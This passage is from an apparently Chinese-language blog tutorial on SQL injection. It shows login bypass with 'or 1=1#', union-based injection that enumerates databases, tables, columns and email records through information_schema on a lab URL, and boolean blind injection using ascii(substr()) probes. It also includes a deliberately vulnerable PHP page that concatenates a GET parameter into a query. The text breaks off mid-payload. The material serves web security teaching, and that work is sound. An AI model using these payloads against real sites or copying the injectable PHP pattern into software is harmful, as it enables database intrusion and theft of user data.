<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Select</span> <span class="operator">*</span> <span class="keyword">from</span> admin <span class="keyword">where</span> username<span class="operator">=</span>’admin’ <span class="keyword">and</span> password<span class="operator">=</span>’’<span class="keyword">or</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span>#’ </span><br></pre></td></tr></table></figure>

<p>Explain:上面的这个语句执行后，我们在不知道密码的情况下就登录到了 admin 用户了。 原 因 是 在 <code>where </code>子 句 后 ， 我 们 可 以 看 到 三 个 条 件 语 句 <code>username=’admin’</code> and <code>password=’’</code>or <code>1=1</code>。三个条件用 <code>and </code>和<code>or</code>进行连接。<br>在 sql 中，我们 <code>and</code> 的运算优先级大于 <code>or</code> 的元算优先级。因此可以看到 第一个条件（用 a 表示）是真的，第二个条件（用 b 表示）是假的，a and b = false,第一个条件和第二个条件执行 and 后是假，再与第三 个条件 or 运算，因为第三个条件 1=1 是恒成立的，所以结果自然就为真了。因此上述的语 句就是恒真了</p>
<p><img src="https://cdn.staticaly.com/gh/Abyssun/picx-images-hosting@master/20200917160825.2x20ok1j3am0.png" alt="20200917160825"></p>
<ol>
<li>Select * from users where id=1 and 1=1;</li>
<li>Select * from users where id=1 &amp;&amp; 1=1;</li>
<li>Select * from users where id=1 &amp; 1=1;</li>
</ol>
<p>上述三者有什么区别?<br>1和2是一样的，表达的意思是 <code>id=1</code> 条件和 <code>1=1</code> 条件进行与运算。<br>3的意思是 id=1 条件与 1 进行&amp;位操作，id=1 被当作 true，与 1 进行 &amp; 运算 结果还是 1， 再进行=操作，1=1,还是 1（ps：&amp;的优先级大于=）<br>Ps:此处进行的位运算。我们可以将数转换为二进制再进行与、或、非、异或等运算。必要 的时候可以利用该方法进行注入结果。例如将某一字符转换为 ascii 码后，可以分别与 1,2,4,8,16,32.。。。进行与运算，可以得到每一位的值，拼接起来就是 ascii 码值。再从 ascii 值反推回字符。（运用较少）</p>
<h2 id="注入流程"><a href="#注入流程" class="headerlink" title="注入流程"></a>注入流程</h2><p><img src="https://cdn.staticaly.com/gh/Abyssun/picx-images-hosting@master/20200917161058.2ajuutv1qj0g.png" alt="20200917161058"></p>
<p>我们的数据库存储的数据按照上图的形式，一个数据库当中有很多的数据表，数据表当中有 很多的列，每一列当中存储着数据。我们注入的过程就是先拿到数据库名，在获取到当前数 据库名下的数据表，再获取当前数据表下的列，最后获取数据。</p>
<h1 id="SQL注入各类详解（部分）"><a href="#SQL注入各类详解（部分）" class="headerlink" title="SQL注入各类详解（部分）"></a>SQL注入各类详解（部分）</h1><h2 id="union注入"><a href="#union注入" class="headerlink" title="union注入"></a>union注入</h2><h3 id="union注入攻击"><a href="#union注入攻击" class="headerlink" title="union注入攻击"></a>union注入攻击</h3><p>1）判断是否存在注入</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">URL:http://www.tianchi.com/web/union.php?<span class="built_in">id</span>=1</span><br><span class="line"></span><br><span class="line">URL:http://www.tianchi.com/web/union.php?<span class="built_in">id</span>=1<span class="string">&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">URL:http://www.tianchi.com/web/union.php?id=1 and 1=1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">URL:http://www.tianchi.com/web/union.php?id=1 and 1=2</span></span><br></pre></td></tr></table></figure>

<p>发现可能存在SQL注入漏洞。</p>
<p>2）查询字段数量</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">URL:http://www.tianchi.com/web/union.php?<span class="built_in">id</span>=1 order by 3</span><br></pre></td></tr></table></figure>

<p>当id=1 order by 3时，页面返回与id=1相同的结果；而id=1 order by 4时不一样，故字段数量是3。<br><img src="https://cdn.staticaly.com/gh/Abyssun/picx-images-hosting@master/20200918002743.epuncqq6eag.png" alt="20200918002743"></p>
<p>3）查询SQL语句插入位置</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">URL:http://www.tianchi.com/web/union.php?<span class="built_in">id</span>=-1 union select 1,2,3</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.staticaly.com/gh/Abyssun/picx-images-hosting@master/20200918002819.5f7vuregbdc0.png" alt="20200918002819"><br>可以看到2,3位置可以插入SQL语句。</p>
<p>4）获取数据库库名</p>
<p>（1）获取当前数据库库名</p>
<p>2位置修改为：database()</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">URL:http://www.tianchi.com/web/union.php?<span class="built_in">id</span>=-1 union select 1,database(),3</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.staticaly.com/gh/Abyssun/picx-images-hosting@master/20200918002838.62osyl6zrro0.png"></p>
<p>（2）获取所有数据库库名</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">URL:http:<span class="operator">/</span><span class="operator">/</span>www.tianchi.com<span class="operator">/</span>web<span class="operator">/</span>union.php?id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(<span class="type">char</span>(<span class="number">32</span>,<span class="number">58</span>,<span class="number">32</span>),schema_name),<span class="number">3</span> <span class="keyword">from</span> information_schema.schemata</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.staticaly.com/gh/Abyssun/picx-images-hosting@master/20200918002857.3zutusd6fkm0.png" alt="20200918002857"></p>
<p>（3）逐条获取数据库库名</p>
<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">语句：<span class="keyword">select</span> schema_name <span class="keyword">from</span> information_schema.schemata limit <span class="number">0</span>,<span class="number">1</span>;</span><br></pre></td></tr></table></figure>

<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">URL:http:<span class="operator">/</span><span class="operator">/</span>www.tianchi.com<span class="operator">/</span>web<span class="operator">/</span>union.php?id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> schema_name <span class="keyword">from</span> information_schema.schemata limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">3</span></span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.staticaly.com/gh/Abyssun/picx-images-hosting@master/20200918002912.4kbfsbx5gzc0.png" alt="20200918002912"></p>
<p>修改limit中第一个数字，如获取第二个库名：limit 1,1。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">数据库库名：information_schema,challenges,dedecmsv57utf8sp2,dvwa,mysql,performance_schema,security,<span class="built_in">test</span>,xssplatform</span><br></pre></td></tr></table></figure>

<p>5）获取数据库表名</p>
<p>（1）方法一：</p>
<p>获取数据库表名，这种方式一次获取一个表名，2位置修改为：</p>
<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="string">&#x27;security&#x27;</span> limit <span class="number">0</span>,<span class="number">1</span>;</span><br></pre></td></tr></table></figure>

<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">URL:http:<span class="operator">/</span><span class="operator">/</span>www.tianchi.com<span class="operator">/</span>web<span class="operator">/</span>union.php?id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;security&#x27;</span> limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">3</span></span><br></pre></td></tr></table></figure>

<p>修改limit中第一个数字，如获取第二个表名：limit 1,1，这样就可以获取所有的表名。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">表名是：emails,referers,uagents,<span class="built_in">users</span>。</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/hirak0/hirak0-images/blog/sql/20200918002925.png" alt="img">（2)方法二：</p>
<p>一次性获取当前数据库所有表名：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">URL:http:<span class="operator">/</span><span class="operator">/</span>www.tianchi.com<span class="operator">/</span>web<span class="operator">/</span>union.php?id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(<span class="type">char</span>(<span class="number">32</span>,<span class="number">58</span>,<span class="number">32</span>),table_name),<span class="number">3</span> <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;security&#x27;</span></span><br></pre></td></tr></table></figure>

<p><img src="E:\01TYSEC_BLOG\Hexo\source\img\【SQL注入】SQL注入这一篇就够了\20200918002946.png" alt="img"></p>
<p>6）获取字段名</p>
<p>（1）方法一：</p>
<p>获取字段名，以emails表为例，2位置修改为：</p>
<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema=<span class="string">&#x27;security&#x27;</span> <span class="keyword">and</span> table_name=<span class="string">&#x27;emails&#x27;</span> limit <span class="number">0</span>,<span class="number">1</span>;</span><br></pre></td></tr></table></figure>

<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">URL:http:<span class="operator">/</span><span class="operator">/</span>www.tianchi.com<span class="operator">/</span>web<span class="operator">/</span>union.php?id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;security&#x27;</span> <span class="keyword">and</span> table_name<span class="operator">=</span><span class="string">&#x27;emails&#x27;</span> limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">3</span></span><br></pre></td></tr></table></figure>

<p>修改limit中第一个数字，如获取第二个字段名：limit 1,1</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">字段名：<span class="built_in">id</span>,email_id。</span><br></pre></td></tr></table></figure>

<p><img src="E:\01TYSEC_BLOG\Hexo\source\img\【SQL注入】SQL注入这一篇就够了\20200918003003.png" alt="img">（2)方法二：</p>
<p>以emails表为例，一次性获取所有字段名：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">URL:http:<span class="operator">/</span><span class="operator">/</span>www.tianchi.com<span class="operator">/</span>web<span class="operator">/</span>union.php?id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(<span class="type">char</span>(<span class="number">32</span>,<span class="number">58</span>,<span class="number">32</span>),column_name),<span class="number">3</span> <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;security&#x27;</span> <span class="keyword">and</span> table_name<span class="operator">=</span><span class="string">&#x27;emails&#x27;</span></span><br></pre></td></tr></table></figure>

<p><img src="E:\01TYSEC_BLOG\Hexo\source\img\【SQL注入】SQL注入这一篇就够了\20200918003021.png" alt="img"></p>
<p>7）获取数据</p>
<p>（1）方法一：</p>
<p>获取数据，以emails表为例，2,3位置分别修改为：</p>
<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="keyword">select</span> id <span class="keyword">from</span> security.emails limit <span class="number">0</span>,<span class="number">1</span>),(<span class="keyword">select</span> email_id <span class="keyword">from</span> security.emails limit <span class="number">0</span>,<span class="number">1</span>)</span><br></pre></td></tr></table></figure>

<p>获取emails表第一，第二条数据：</p>
<figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">1 </span>: Dumb@dhakkan.<span class="keyword">com</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">2 </span>: Angel@iloveu.<span class="keyword">com</span></span><br></pre></td></tr></table></figure>

<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">URL:http:<span class="operator">/</span><span class="operator">/</span>www.tianchi.com<span class="operator">/</span>web<span class="operator">/</span>union.php?id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> id <span class="keyword">from</span> security.emails limit <span class="number">0</span>,<span class="number">1</span>),(<span class="keyword">select</span> email_id <span class="keyword">from</span> security.emails limit <span class="number">0</span>,<span class="number">1</span>)</span><br></pre></td></tr></table></figure>

<p><img src="E:\01TYSEC_BLOG\Hexo\source\img\【SQL注入】SQL注入这一篇就够了\20200918003031.png" alt="img"><br>（2)方法二：</p>
<p>以emails表为例，一次性获取所有数据：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">URL:http:<span class="operator">/</span><span class="operator">/</span>www.tianchi.com<span class="operator">/</span>web<span class="operator">/</span>union.php?id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(<span class="type">char</span>(<span class="number">32</span>,<span class="number">58</span>,<span class="number">32</span>),id,email_id),<span class="number">3</span> <span class="keyword">from</span> security.emails</span><br></pre></td></tr></table></figure>

<p><img src="E:\01TYSEC_BLOG\Hexo\source\img\【SQL注入】SQL注入这一篇就够了\20200918003047.png" alt="img"></p>
<p>1.2 union注入PHP代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$con</span>=<span class="title function_ invoke__">mysqli_connect</span>(<span class="string">&quot;localhost&quot;</span>,<span class="string">&quot;root&quot;</span>,<span class="string">&quot;root&quot;</span>,<span class="string">&quot;security&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">mysqli_set_charset</span>(<span class="variable">$con</span>,<span class="string">&#x27;utf8&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$con</span>)&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;Connect failed : &quot;</span>.<span class="title function_ invoke__">mysqli_connect_error</span>();</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="variable">$id</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$con</span>,<span class="string">&quot;select * from users where id=&quot;</span>.<span class="variable">$id</span> );</span><br><span class="line"><span class="variable">$row</span>=<span class="title function_ invoke__">mysqli_fetch_array</span>(<span class="variable">$result</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$row</span>[<span class="string">&#x27;username&#x27;</span>].<span class="string">&quot; : &quot;</span>.<span class="variable">$row</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="基于布尔的SQL盲注"><a href="#基于布尔的SQL盲注" class="headerlink" title="基于布尔的SQL盲注"></a>基于布尔的SQL盲注</h2><table>
<thead>
<tr>
<th align="left">普通SQL注入</th>
<th align="left">SQL盲注</th>
</tr>
</thead>
<tbody><tr>
<td align="left">执行SQL注入攻击时，服务器会响应来自数据库服务器的错误信息，信息提示SQL语法不正确等</td>
<td align="left">一般情况，执行SQL盲注，服务器不会直接返回具体的数据库错误or语法错误，而是会返回程序开发所设置的特定信息（也有特例，如基于报错的盲注）</td>
</tr>
<tr>
<td align="left">一般在页面上直接就会显示执行sql语句的结果</td>
<td align="left">一般在页面上不会直接显示sql执行的结果</td>
</tr>
</tbody></table>
<ul>
<li>有可能出现不确定sql是否执行的情况</li>
</ul>
<h3 id="1-判断是否存在注入和注入类型"><a href="#1-判断是否存在注入和注入类型" class="headerlink" title="1.判断是否存在注入和注入类型"></a>1.判断是否存在注入和注入类型</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; or 1=1 不存在</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">or</span> <span class="string">&#x27;1&#x27;</span><span class="operator">=</span><span class="string">&#x27;1 存在</span></span><br></pre></td></tr></table></figure>

<p>判断为字符型</p>
<h3 id="2-判断数据库中表的数量"><a href="#2-判断数据库中表的数量" class="headerlink" title="2.判断数据库中表的数量"></a>2.判断数据库中表的数量</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; and (select count(table_name) from information_schema.tables where table_schema=database())=1#    不存在</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">and</span> (<span class="keyword">select</span> <span class="built_in">count</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database())<span class="operator">=</span><span class="number">2</span>#    存在</span><br></pre></td></tr></table></figure>

<p>有两张表</p>
<h3 id="3-判断表名长度"><a href="#3-判断表名长度" class="headerlink" title="3.判断表名长度"></a>3.判断表名长度</h3><p>第一张表:</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; and (select length(table_name) from information_schema.tables where table_schema=database() limit 0,1)=1#  不存在</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">and</span> (<span class="keyword">select</span> length(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database() limit <span class="number">0</span>,<span class="number">1</span>)<span class="operator">=</span><span class="number">2</span>#  不存在</span><br><span class="line"></span><br><span class="line">··················</span><br><span class="line"></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; and (select length(table_name) from information_schema.tables where table_schema=database() limit 0,1)=9#  存在</span></span><br></pre></td></tr></table></figure>

<p>第一张表名长度为<code>9</code></p>
<p>第二张表:</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; and (select length(table_name) from information_schema.tables where table_schema=database() limit 1,1)=1# 不存在</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">…………</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">and</span> (<span class="keyword">select</span> length(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database() limit <span class="number">1</span>,<span class="number">1</span>)<span class="operator">=</span><span class="number">5</span># 存在</span><br></pre></td></tr></table></figure>

<p>第二张表名长度为<code>5</code></p>
<h3 id="4-判断表名"><a href="#4-判断表名" class="headerlink" title="4.判断表名"></a>4.判断表名</h3><p>第一张表:</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">第一个字母:</span><br><span class="line"><span class="number">1</span><span class="string">&#x27; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;97# 存在</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">and</span> ascii(substr((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database() limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">&lt;</span><span class="number">122</span># 存在</span><br><span class="line"><span class="number">1</span><span class="string">&#x27; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;109# 不存在</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">and</span> ascii(substr((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database() limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">&lt;</span><span class="number">103</span># 不存在</span><br><span class="line"><span class="number">1</span><span class="string">&#x27; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;106# 不存在</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">and</span> ascii(substr((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database() limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">=</span><span class="number">103</span>#  存在</span><br></pre></td></tr></table></figure>

<p>第一个字母为<code>g</code></p>
<p>第二个字母:</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),2,1))&gt;97#    存在</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">and</span> ascii(substr((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database() limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">2</span>,<span class="number">1</span>))<span class="operator">&lt;</span><span class="number">122</span>#    存在</span><br><span class="line"><span class="number">1</span><span class="string">&#x27; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),2,1))&gt;109#    存在</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">and</span> ascii(substr((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database() limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">2</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">115</span>#    存在</span><br><span class="line"><span class="number">1</span><span class="string">&#x27; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),2,1))&gt;118# 不存在</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">and</span> ascii(substr((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database() limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">2</span>,<span class="number">1</span>))<span class="operator">=</span><span class="number">116</span># 不存在</span><br><span class="line"><span class="number">1</span><span class="string">&#x27; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),2,1))=117#    存在</span></span><br></pre></td></tr></table></figure>

<p>第二个字母为<code>u</code><br>以此类推…</p>
<p>第二张表:</p>
<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">第一个字母:</span><br><span class="line"><span class="number">1&#x27;</span> <span class="function"><span class="keyword">and</span> <span class="title">ascii</span>(<span class="params">substr((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=database(</span>) limit 1,1),1,1))&gt;97#</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">.............</span></span><br></pre></td></tr></table></figure>

<p>第一个字母为<code>u</code></p>
<p>以此类推得到第二张表表名为<code>users</code></p>
<h3 id="5-判断表中的字段数"><a href="#5-判断表中的字段数" class="headerlink" title="5.判断表中的字段数"></a>5.判断表中的字段数</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; and (select count(column_name) from information_schema.columns where table_name=&#x27;</span>users<span class="string">&#x27;)=1#        不成功</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">and</span> (<span class="keyword">select</span> <span class="built_in">count</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;users&#x27;</span>)<span class="operator">=</span><span class="number">14</span>#        成功</span><br></pre></td></tr></table></figure>

<p>有<code>14</code>个字段</p>
<h3 id="6-判断每个字段的长度"><a href="#6-判断每个字段的长度" class="headerlink" title="6.判断每个字段的长度"></a>6.判断每个字段的长度</h3><p>第一列:</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; and length(substr((select column_name from information_schema.columns where table_name=&#x27;</span>users<span class="string">&#x27; limit 0,1),1))=1#</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">and</span> length(substr((<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;users&#x27;</span> limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>))<span class="operator">=</span><span class="number">7</span>#成功</span><br></pre></td></tr></table></figure>

<p>第一列长度为7</p>
<p>第二列:</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; and length(substr((select column_name from information_schema.columns where table_name=&#x27;</span>users<span class="string">&#x27; limit 1,1),1))=1#</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">and</span> length(substr((<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;users&#x27;</span> limit <span class="number">1</span>,<span class="number">1</span>),<span class="number">1</span>))<span class="operator">=</span><span class="number">10</span>#</span><br></pre></td></tr></table></figure>

<p>第二列长度为<code>10</code></p>
<p>第三列:</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; and length(substr((select column_name from information_schema.columns where table_name=&#x27;</span>users<span class="string">&#x27; limit 2,1),1))=1#</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">and</span> length(substr((<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;users&#x27;</span> limit <span class="number">2</span>,<span class="number">1</span>),<span class="number">1</span>))<span class="operator">=</span><span class="number">9</span>#</span><br></pre></td></tr></table></figure>

<p>第三列长度为<code>9</code><br>以此类推，<br>每一列列名的长度分别为</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">7,10,9,4,8,6,10,12,4,19,17,2,8,8</span><br></pre></td></tr></table></figure>

<h3 id="7-判断字段名"><a href="#7-判断字段名" class="headerlink" title="7.判断字段名"></a>7.判断字段名</h3><p>我们可以猜测，上面长度为<code>4</code>,<code>8</code>的列应该就是我们想要的<code>user</code>，<code>password</code>列了<br>进行验证:</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; and ascii(substr((select column_name from information_schema.columns where table_name=&#x27;</span>users<span class="string">&#x27; limit 3,1),1,1))&gt;97# 存在</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">and</span> ascii(substr((<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;users&#x27;</span> limit <span class="number">3</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">&lt;</span><span class="number">122</span># 存在</span><br><span class="line"><span class="number">1</span><span class="string">&#x27; and ascii(substr((select column_name from information_schema.columns where table_name=&#x27;</span>users<span class="string">&#x27; limit 3,1),1,1))&gt;109# 存在</span></span><br><span class="line"><span class="string">1&#x27;</span> 